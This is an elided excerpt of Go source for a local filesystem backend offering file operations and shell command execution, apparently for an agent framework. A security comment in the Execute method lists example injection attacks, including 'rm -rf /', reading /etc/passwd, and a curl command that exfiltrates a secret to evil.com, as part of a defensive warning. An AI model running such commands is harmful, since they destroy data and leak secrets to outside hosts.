...
// NewLocalBackend creates a new local filesystem backend instance.
//
// IMPORTANT - System Compatibility:
//   - Supported: Unix/MacOS only
//   - NOT Supported: Windows (requires custom implementation of LocalBackend)
//   - Command Execution: Uses /bin/sh by default for Execute method
//   - If /bin/sh does not meet your requirements, please implement your own LocalBackend
func NewLocalBackend(_ context.Context, cfg *Config) (filesystem.Backend, error) {
	if cfg == nil {
...
func (s *localBackend) LsInfo(ctx context.Context, req *filesystem.LsInfoRequest) ([]filesystem.FileInfo, error) {
	if req.Path == "" {
...
func (s *localBackend) Read(ctx context.Context, req *filesystem.ReadRequest) (string, error) {
...
func (s *localBackend) GrepRaw(ctx context.Context, req *filesystem.GrepRequest) ([]filesystem.GrepMatch, error) {
	path := filepath.Clean(req.Path)
...
func (s *localBackend) GlobInfo(ctx context.Context, req *filesystem.GlobInfoRequest) ([]filesystem.FileInfo, error) {
	if req.Path == "" {
		req.Path = defaultRootPath
	}
	path := filepath.Clean(req.Path)
...
func (s *localBackend) Write(ctx context.Context, req *filesystem.WriteRequest) error {
...
func (s *localBackend) Edit(ctx context.Context, req *filesystem.EditRequest) error {
	path := filepath.Clean(req.FilePath)
	if !filepath.IsAbs(path) {
		return fmt.Errorf("path must be an absolute path: %s", path)
	}
...
func (s *localBackend) Execute(ctx context.Context, input *filesystem.ExecuteRequest) (result *filesystem.ExecuteResponse, err error) {
	if input.Command == "" {
		return nil, fmt.Errorf("command is required")
	}

	// SECURITY WARNING: Command Injection Risk
	// The validateCommand function MUST be properly implemented to prevent command injection attacks.
	// Without proper validation, malicious users can inject arbitrary shell commands using special characters
	// like semicolons (;), pipes (|), backticks (`), or command substitution $().
	//
	// Example attacks without validation:
	//   - "ls; rm -rf /" - executes multiple commands
	//   - "cat /etc/passwd" - reads sensitive files
	//   - "curl http://evil.com/$(cat secret)" - exfiltrates data
	//
	// Recommended validateCommand implementation should:
	//   1. Use a whitelist of allowed commands
	//   2. Block shell metacharacters: ; | & $ ` ( ) < > \ \n
	//   3. Validate command arguments
	//   4. Restrict file path access
	if s.validateCommand != nil {
	...
	if err != nil {
		...
		return nil, fmt.Errorf("command exited with non-zero code %d: %s", exitCode, string(output))
	}
...
func (s *localBackend) ExecuteStreaming(ctx context.Context, input *filesystem.ExecuteRequest) (result *schema.StreamReader[*filesystem.ExecuteResponse], err error) {
	if input.Command == "" {
		return nil, fmt.Errorf("command is required")
	}
	...
	go func() {
		defer func() {
			if r := recover(); r != nil {
				w.Send(nil, fmt.Errorf("panic in ExecuteStreaming: %v", r))
			}
			w.Close()
		}()
		...
		go func() {
			defer func() {
				if r := recover(); r != nil {
					stderrErr <- fmt.Errorf("panic reading stderr: %v", r)
					return
				}
				close(stderrErr)
			}()
